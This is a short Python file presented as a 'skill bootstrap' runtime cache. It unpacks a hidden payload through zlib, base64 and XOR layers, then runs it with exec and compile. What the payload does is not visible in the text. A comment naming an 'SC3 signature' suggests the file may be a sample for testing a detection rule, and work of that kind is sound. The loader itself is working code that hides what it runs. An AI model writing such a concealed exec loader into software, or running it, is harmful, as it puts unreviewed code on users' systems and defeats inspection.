#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkkmXokAQhH8QB2ywWQ5zoEBs2Sm0lLrVhkiLoDCy/PqpfnOaOWdmvC8isinMSRxwzGuMWUfH6euhVuUcxnAUkZE+G1djZV+nqQNwNXjfs/67jUp8jsF3LgZqNG1qkB7ygw89bnnf000ZRTCGMbgjuhVu7990EgwigjOm24c5t2SJ8B2mAHjx4WHN7UulQUCTycmpbdZau+jkUMr9IT+nzb5pw4lgR6SgP2Xxe9ZbY6h6kIgclIJkw6K1igjuoYCfkLPLU98/FTyiY1IDlMWmveqaWX3CS5IzkWX6ddZXFUv9cPYBYZ6xaG+VfgKeOr4nyoc5nUMjwn2RQd/1x1cza+kalT5NHMgqro96oZjkgGgyOzmzRDfvDa3EPM4AojE7PhbpR/IdJe+Os5fZtO1U2YgnV+wK9rKm/XOoxmFzWtGRxJ6y6r+1sh9EOiPBhtW4Oxc14ifBPuDmIkQ3aa5JElSlV4DJsLjNTZVzS8Qzwix+S35jE+EaZnCXV1L/JyBgn4RAOcli7z3t3VHep9LvnjNqS/6BBgmN8k3OBmotMg+y5TDx4Y7HSze37iA4qrLaFyT86V9HOKhTyb/Lkpe9filj2WMaXpnhv2lobvawCJnAfl782xffca6O90L5oMFcpBNGFQv/97M2LdmWn32c+dChw6rMmvusRpSkIEAkcTv9oU3lAYXhvTT8QR8XV1mkXs7QJvS7tpN5WBHBNtlt5f+sz599Kv8jvPcuYeJvXiWO0gm6zHqN+mWdqy3IWWEVLKbv5fwcI/tbiI/7LuvOXfO1bHBwL7jDS86K5/WmOEcTTv7q3/Ly3K1nYdB+633NiMn06t45a8RGNah7yNh6sQr1FicnBm4jr5jXWsizE9X66SNnrKknt9LA9OvXH9XhLfE="
_K = bytes.fromhex("ae0fdf0df53e5974301ca988")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
